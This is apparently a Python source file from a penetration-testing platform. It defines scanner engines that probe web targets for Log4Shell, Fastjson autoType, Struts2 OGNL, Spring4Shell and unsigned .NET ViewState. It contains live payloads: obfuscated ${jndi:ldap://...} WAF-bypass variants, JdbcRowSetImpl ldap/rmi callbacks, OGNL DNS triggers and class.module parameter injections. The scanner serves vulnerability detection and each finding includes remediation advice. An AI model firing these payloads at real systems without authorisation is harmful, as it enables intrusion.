# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# engines/framework_zero_day_engines.py
"""
框架级 0day / 复杂反序列化引擎组（v104 新增）
Log4ShellEngine / FastjsonDeserializationEngine / Struts2OGNLEngine / Spring4ShellEngine / ViewStateEngine
设计原则：所有判定都基于"字节级指纹在攻击响应中出现、且在基线响应中不出现"，未命中即返回 None，控制误报。
"""
import asyncio
import re
import base64
from typing import Dict, List, Optional, Tuple

from vulnclaw.core.logger import logger
from vulnclaw.core.settings import settings
from vulnclaw.core.utils import async_get, async_post, build_attack_url
from vulnclaw.engines.base import BaseEngine, enrich_finding

# ============================================================
# OOB 盲打共享支撑（Z2.2）
# 引擎带内无回显时自动追加 JNDI/HTTP 外带载荷，回调即 Critical 实锤。
# 每个 (引擎, 目标origin) 只做一次 OOB，控制开销；interactsh/dnslog 都不可用时静默跳过。
# ============================================================
_OOB_ATTEMPTED: Dict[str, set] = {}  # engine_name -> set(origin)


def _origin_of(url: str) -> str:
    try:
        from urllib.parse import urlsplit
        host = urlsplit(url).netloc or url
    except Exception:  # noqa: BLE001
        host = url
    return host


async def _run_oob_scan(
    engine_name: str,
    url: str,
    param: str,
    parsed_query: str,
    session,
    payload_templates: List[str],
    type_label: str,
    evidence_note: str,
    recommendation: str,
    oob_wait: int = 12,
) -> Optional[Dict]:
    """统一 OOB 盲打：注入外带载荷 → 轮询回调 → 命中即返回 Critical finding。

    只读探测（DNS/HTTP 回调），绝不写文件；无 OOB 通道或超时都返回 None（不产生误报）。

    防自回调误报：payload 内含 http://<token>.<oob>/ 这类「期望被目标请求」的地址，
    若 async_get 跟随重定向，目标一旦把该地址反射进 Location，扫描器自己就会去请求它，
    自产 DNS/HTTP 回调并被 token 命中，误判为 Critical 实锤。故全程 allow_redirects=False。
    """
    key = f"{engine_name}:{_origin_of(url)}"
    dedup = _OOB_ATTEMPTED.setdefault(engine_name, set())
    if key in dedup:
        return None
    dedup.add(key)

    from vulnclaw.core.oob_channel import OOBChannel

    ch = OOBChannel()
    try:
        probe = await ch.make_probe("https")
    except Exception:  # noqa: BLE001
        logger.debug(f"[{engine_name}] OOB 通道异常，跳过")
        return None
    if not probe:
        return None

    token = probe["token"]
    obs_http = probe["url"]          # https://<token>.<domain>/
    obs_dns = f"{token}.{probe['domain']}"
    logger.debug(f"[{engine_name}] OOB 盲打 -> {obs_dns}")

    for template in payload_templates:
        payload = template.replace("{OBS_HTTP}", obs_http).replace("{OBS_DNS}", obs_dns)
        attack_url = build_attack_url(url, param, payload, parsed_query)
        try:
            await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True, allow_redirects=False)
        except Exception:  # noqa: BLE001
            pass
        await asyncio.sleep(0.4)

    hits = await ch.wait_for_interaction(token, timeout=oob_wait)
    if not hits:
        return None
    first = hits[0]
    proto = first.protocol
    ts = (first.extra or {}).get("timestamp") or first.extra.get("time") or first.time or ""
    # Z2.4：把带外回调节点时间戳 + 可复现命令写入 evidence（报告含实锤证据）
    repro_curl = f"curl -s --max-time 5 'http://{obs_dns}/'"
    return enrich_finding({
        'url': url,
        'parameter': param,
        'payload': f'OOB {type_label} -> {obs_dns}',
        'type': f'{type_label}(带外实锤)',
        'severity': 'Critical',
        'ai_verdict': '高',
        'confidence': 'high',
        'evidence': (
            f'{evidence_note}。注入后收到带外回调（{proto}）host={obs_dns}，'
            f'条数={len(hits)}，首条回调节点时间={ts}。'
            f'复现：{repro_curl} —— 无回显环境实锤，可能可 RCE'
        ),
        'oob_evidence': {
            'protocol': proto, 'host': obs_dns, 'token': token,
            'callback_count': len(hits),
            'callback_time': ts,
            'reproduce': repro_curl,
        },
        'recommendation': recommendation,
    })


# ============================================================
# Log4ShellEngine（Log4j2 JNDI / Lookup 注入，CVE-2021-44228 系列）
# ============================================================
class Log4ShellEngine(BaseEngine):
    """Log4j2 Lookup 注入检测（基于 ${lookup} 解析值回显判定，非外带回显）"""

    name = "log4shell"
    description = "Log4j2 Lookup 注入检测（${lookup} 内联解析值回显）"

    priority_params = [
        "id", "name", "q", "user", "x", "jndi", "log", "msg", "message",
        "keyword", "path", "redirect", "callback",
    ]

    payloads: List[Tuple[str, str]] = [
        ("${sys:java.version}", "lookup-sys.java.version"),
        ("${java:version}", "lookup-java"),
        ("${sys:os.name}", "lookup-sys.os.name"),
        ("${date:yyyy}", "lookup-date-year"),
        ("${env:USER}", "lookup-env.USER"),
    ]

    # 每个 lookup 期望的"解析值"特征与基线排除用正则
    RESOLVERS = [
        (r"(?i)\bjava\s+version\s*[:#]?\s*\d", "${sys:java.version}"),
        (r"(?i)\bjava\s*[:#]?\s*\d", "${java:version}"),
        (r"(?i)\b(?:linux|windows|mac os|darwin|aix|solaris)\b", "${sys:os.name}"),
        (r"\b20\d{2}\b", "${date:yyyy}"),
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        normal_text = self.get_normal_text(normal_resp) or ""
        overload_patterns = [re.compile(rx) for rx, _ in self.RESOLVERS]

        for payload, desc in self.payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                if resp is None:
                    continue
                status, text = resp[0], resp[1] or ""
            except Exception as e:
                self.log_debug(f"Log4Shell 检测异常 {param}: {e}")
                continue

            if not isinstance(text, str) or not text:
                continue
            # 字面量仍被原样回显 -> lookup 未被服务端解析，不算命中
            if payload in text:
                continue

            for (rx, pl), rxo in zip(self.RESOLVERS, overload_patterns):
                if pl != payload:
                    continue
                if rxo.search(text) and not rxo.search(normal_text):
                    finding = {
                        'url': attack_url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'Log4j2 Lookup注入({desc})',
                        'severity': 'Critical',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f'注入 `{payload}` 后响应中该字面量消失且出现解析值（命中 `{rxo.pattern}`），基线无 —— 日志框架解析 Lookup，可能可 JNDI 外带 RCE',
                        'status_code': status,
                        'recommendation': '升级 Log4j2 至 2.17.1+，禁用 JNDI Lookup，或设置 log4j2.formatMsgNoLookups=true',
                    }
                    return enrich_finding(finding)
        # Z2.2：带内无回显 → JNDI 外带盲打（DNS/LDAP 回调即实锤）
        return await _run_oob_scan(
            engine_name=self.name, url=url, param=param, parsed_query=parsed_query, session=session,
            payload_templates=[
                "${jndi:dns://{OBS_DNS}}",
                "${jndi:ldap://{OBS_DNS}/a}",
                "${jNdI:ldap://{OBS_DNS}/a}",
                "${jndi:rmi://{OBS_DNS}/a}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{OBS_DNS}/a}",
                "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://{OBS_DNS}/a}",
                "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{OBS_DNS}/a}",
                "${:-${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{OBS_DNS}/a}",
            ],
            type_label='Log4j2 JNDI 注入',
            evidence_note='注入 ${jndi:*}（含 WAF 绕过变体）后命中 OOB（触发服务端 JNDI 查询）',
            recommendation='升级 Log4j2 至 2.17.1+，禁用 JNDI Lookup',
        )
        return None


# ============================================================
# FastjsonDeserializationEngine（autoType 反序列化）
# ============================================================
class FastjsonDeserializationEngine(BaseEngine):
    """Fastjson autoType 反序列化探测（报错回显指纹）"""

    name = "fastjson_deserialization"
    description = "Fastjson autoType 反序列化探测（报错回显指纹）"

    priority_params = [
        "data", "json", "obj", "payload", "param", "params", "x", "action",
        "request", "body", "value",
    ]

    payloads: List[Tuple[str, str]] = [
        ('{"@type":"java.lang.AutoCloseable"}', "autoType-Closeable"),
        ('{"@type":"java.lang.Class"}', "autoType-Class"),
        ('{"@type":["java.lang.Class"]}', "autoType-数组Class"),
        ('{"@type":"com.sun.rowset.JdbcRowSetImpl"}', "autoType-JdbcRowSet"),
    ]

    FASTJSON_ERROR_PATTERNS = [
        "fastjson", "com.alibaba.fastjson", "jsonexception",
        "autotype", "org.apache.commons.", "typeexception",
        "unexpected token", "syntax error", "parseexception",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        normal_text = self.get_normal_text(normal_resp) or ""

        for payload, desc in self.payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                if resp is None:
                    continue
                status, text = resp[0], resp[1] or ""
            except Exception as e:
                self.log_debug(f"Fastjson 检测异常 {param}: {e}")
                continue

            if not isinstance(text, str):
                continue
            text_lower = text.lower()
            for sig in self.FASTJSON_ERROR_PATTERNS:
                if sig in text_lower and sig not in normal_text.lower():
                    finding = {
                        'url': attack_url,
                        'parameter': param,
                        'payload': payload[:40],
                        'type': f'Fastjson反序列化({desc})',
                        'severity': 'Critical',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f'注入 JSON 后响应出现 Fastjson 错误特征 `{sig}`,基线无 —— autoType 解析在处理，可能可触发 JNDI 链',
                        'status_code': status,
                        'recommendation': '升级 Fastjson 至 1.2.83+ 或 2.x，或改用 Jackson 并配置安全后备',
                    }
                    return enrich_finding(finding)
        # Z2.2：带内无报错回显 → JNDI/DNS 外带盲打（回调即实锤）
        return await _run_oob_scan(
            engine_name=self.name, url=url, param=param, parsed_query=parsed_query, session=session,
            payload_templates=[
                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{OBS_DNS}/a","autoCommit":true}',
                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{OBS_DNS}/a","autoCommit":true}',
                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"dns://{OBS_DNS}/a","autoCommit":true}',
                '{"@type":"java.net.Inet4Address","val":"{OBS_DNS}"}',
                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{OBS_DNS}","autoCommit":true}',
            ],
            type_label='Fastjson JNDI 注入',
            evidence_note='注入 autoType 外带载荷后命中 OOB（触发 JdbcRowSetImpl/Inet4Address 回调）',
            recommendation='升级 Fastjson 至 1.2.83+ 或 2.x，或改用 Jackson 并配置安全后备',
        )
        return None


# ============================================================
# Struts2OGNLEngine（S2-xxx OGNL 表达式注入）
# ============================================================
class Struts2OGNLEngine(BaseEngine):
    """Struts2 OGNL 表达式注入（数学运算回显水印 + 报错指纹）"""

    name = "struts2_ognl"
    description = "Struts2 OGNL 表达式注入检出（数学回显水印 + 报错指纹）"

    priority_params = [
        "id", "name", "action", "x", "q", "method", "redirect", "return",
    ]

    MATH_HITS = [
        ("%{123+456}", "579"),
        ("${123+456}", "579"),
        ("%{233*233}", "54289"),
        ("${(233*233)}", "54289"),
    ]

    OGNL_ERROR_PATTERNS = [
        "java.lang", "ognl", "org.apache.struts", "stacktrace",
        "does not find the value", "struts",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        normal_text = self.get_normal_text(normal_resp) or ""

        for payload, expected in self.MATH_HITS:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                if resp is None:
                    continue
                status, text = resp[0], resp[1] or ""
            except Exception as e:
                self.log_debug(f"OGNL 检测异常 {param}: {e}")
                continue

            if not isinstance(text, str):
                continue
            if expected in text and payload not in text and expected not in normal_text:
                finding = {
                    'url': attack_url,
                    'parameter': param,
                    'payload': payload,
                    'type': 'Struts2 OGNL注入(数学回显)',
                    'severity': 'Critical',
                    'ai_verdict': '高',
                    'confidence': 'high',
                    'evidence': f'注入 OGNL `{payload}` 后响应回显运算结果 `{expected}`（字面量消失、基线无）—— OGNL 被服务端求值，可能可 RCE',
                    'status_code': status,
                    'recommendation': '升级 Struts2 至官方安全版本（修复 S2-xxx）',
                }
                return enrich_finding(finding)

        # 备用：报错指纹
        for payload, _exp in self.MATH_HITS[:2]:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                if resp is None:
                    continue
                text = resp[1] or ""
            except Exception:
                continue
            if not isinstance(text, str):
                continue
            text_lower = text.lower()
            for sig in self.OGNL_ERROR_PATTERNS:
                if sig in text_lower and sig not in normal_text.lower():
                    finding = {
                        'url': attack_url,
                        'parameter': param,
                        'payload': payload,
                        'type': 'Struts2 OGNL注入-疑似(报错)',
                        'severity': 'High',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': f'注入 OGNL `{payload}` 后响应出现 `{sig}` 错误特征（基线无）',
                        'recommendation': '升级 Struts2 至最新安全版本',
                    }
                    return enrich_finding(finding)
        # Z2.2：带内均无回显 → OGNL 静态方法触发 DNS 解析外带（回调即实锤）
        return await _run_oob_scan(
            engine_name=self.name, url=url, param=param, parsed_query=parsed_query, session=session,
            payload_templates=[
                '%{#a=@java.net.InetAddress@getByName("{OBS_DNS}")}',
                '${@java.net.InetAddress@getByName("{OBS_DNS}")}',
            ],
            type_label='Struts2 OGNL 执行',
            evidence_note='注入 OGNL 静态方法触发 DNS 解析后命中 OOB（证明 OGNL 被服务端执行）',
            recommendation='升级 Struts2 至官方安全版本（修复 S2-xxx）',
        )
        return None


# ============================================================
# Spring4ShellEngine（CVE-2022-22965 探测，保守）
# ============================================================
class Spring4ShellEngine(BaseEngine):
    """Spring4Shell / CVE-2022-22965 探测（class.module 参数注入报错指纹，保守判定）"""

    name = "spring4shell"
    description = "Spring4Shell(CVE-2022-22965)探测（class.module 参数报错指纹）"

    priority_params = ["id", "name", "x", "q", "file", "upload"]

    S4S_PAYLOADS = [
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=vlc",
        "class.module.classLoader.DefaultFilterChainProxy=vlc",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
    ]

    S4S_ERROR_PATTERNS = [
        "class.module", "requestrejectedexception", "invalid character",
        "overflow", "bad request", "filterchainproxy",
        "classloader",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        normal_text = self.get_normal_text(normal_resp) or ""
        for payload in self.S4S_PAYLOADS:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)
                if resp is None:
                    continue
                status, text = resp[0], resp[1] or ""
            except Exception as e:
                self.log_debug(f"Spring4Shell 检测异常 {param}: {e}")
                continue
            if not isinstance(text, str):
                continue
            text_lower = text.lower()
            for sig in self.S4S_ERROR_PATTERNS:
                if sig in text_lower and sig not in normal_text.lower():
                    finding = {
                        'url': attack_url,
                        'parameter': param,
                        'payload': payload[:60],
                        'type': 'Spring4Shell-疑似(参数解析特征)',
                        'severity': 'High',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': f'注入 `class.module.*` 命名参数后响应出现 `{sig}` 特征（基线无）：疑似进入 Spring 参数绑定，建议人工验证是否可写 JSP 实现 RCE',
                        'status_code': status,
                        'recommendation': '升级 Spring Framework 至 >=5.3.18/5.2.20，禁用 class.* 属性绑定',
                    }
                    return enrich_finding(finding)
        return None


# ============================================================
# ViewStateEngine（.NET ViewState 未启用 MAC 校验）
# ============================================================
class ViewStateEngine(BaseEngine):
    """.NET ViewState MAC 校验缺失检测（scan 型：篡改 __VIEWSTATE 观察回显）"""

    name = "view_state"
    description = ".NET ViewState MAC 校验缺失检测（篡改 __VIEWSTATE 判定）"

    VIEWSTATE_RE = re.compile(r'<input[^>]+name=["\']__VIEWSTATE["\'][^>]*value=["\']([^"\']*)["\']', re.I)
    GENERATOR_RE = re.compile(r'<input[^>]+name=["\']__VIEWSTATEGENERATOR["\'][^>]*value=["\']([^"\']*)["\']', re.I)

    MAC_ERROR_PATTERNS = [
        "view state mac validation failed",
        "validation of viewstate mac failed",
        "the state information is invalid",
        "unable to validate data",
        "object reference not set",
    ]

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        findings: List[Dict] = []
        try:
            resp = await async_get(target, session=session, timeout=settings.timeout, no_retry=True)
            if resp is None:
                return findings
            text = resp[1] or ""
            if not isinstance(text, str) or "__VIEWSTATE" not in text:
                self.log_debug("目标无 __VIEWSTATE 字段，跳过")
                return findings

            m = self.VIEWSTATE_RE.search(text)
            if not m:
                return findings
            original = m.group(1)

            try:
                decoded = base64.b64decode(original, validate=False)
            except Exception:
                decoded = b""
            tampered_bytes = bytearray((decoded or b"\x00" * 16))
            tampered_bytes[len(tampered_bytes) // 2] ^= 0x01
            tampered = base64.b64encode(bytes(tampered_bytes)).decode()
            tampered += "=" * (-len(tampered) % 4)

            post_data = {"__VIEWSTATE": tampered}
            gen = self.GENERATOR_RE.search(text)
            if gen:
                post_data["__VIEWSTATEGENERATOR"] = gen.group(1)

            resp2 = await async_post(target, data=post_data, session=session, timeout=settings.timeout, no_retry=True)
            if resp2 is None:
                return findings
            status, post_text = resp2[0], resp2[1] or ""
            if not isinstance(post_text, str):
                return findings
            post_lower = post_text.lower()
            for sig in self.MAC_ERROR_PATTERNS:
                if sig in post_lower:
                    findings.append({
                        'url': target,
                        'parameter': '__VIEWSTATE',
                        'payload': f'base64 翻转(长度{len(tampered_bytes)})',
                        'type': 'ViewState未启用MAC校验',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f'篡改 __VIEWSTATE（翻转中间字节）后回显 `{sig}` —— 服务端直接解析未签名 ViewState，可构造恶意反序列化(YSOSerial.Net)',
                        'recommendation': '启用 ViewState MAC(enableViewStateMac=true + machineKey),或升级 .NET 4.5.2+ 并保留兼容开关',
                    })
                    return findings
        except Exception as e:
            logger.debug(f"[{self.name}] ViewState 检测异常: {e}")
        return findings

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        return None


__all__ = [
    'Log4ShellEngine',
    'FastjsonDeserializationEngine',
    'Struts2OGNLEngine',
    'Spring4ShellEngine',
    'ViewStateEngine',
]